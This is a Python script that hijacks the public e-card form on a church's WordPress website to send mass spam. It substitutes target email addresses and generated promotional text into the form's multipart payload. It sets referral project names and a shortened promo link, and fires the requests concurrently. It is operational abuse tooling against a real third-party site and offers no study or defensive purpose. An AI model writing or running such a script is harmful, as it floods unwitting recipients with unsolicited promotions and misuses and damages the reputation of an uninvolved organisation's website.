import requests

import module

url = 'https://bethlehemunitedmethodist.org/angel-ecards/'

headers = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarylvgy46BgLoaXdpkS',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}

DATA = '------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n12689\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n10102\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n0\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\ntest\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\ntest\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundarylvgy46BgLoaXdpkS--\r\n'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        data = DATA.replace('test', self.get_text()).replace('softumwork@gmail.com', target)
        response = requests.post(url,
                                 headers=headers,
                                 data=data.encode())
        return response


if __name__ == '__main__':
    project_name = 'bethlehemunitedmethodist'
    s = 'successfully'

    project = 'fortuneclock'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3FCyfZe'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()
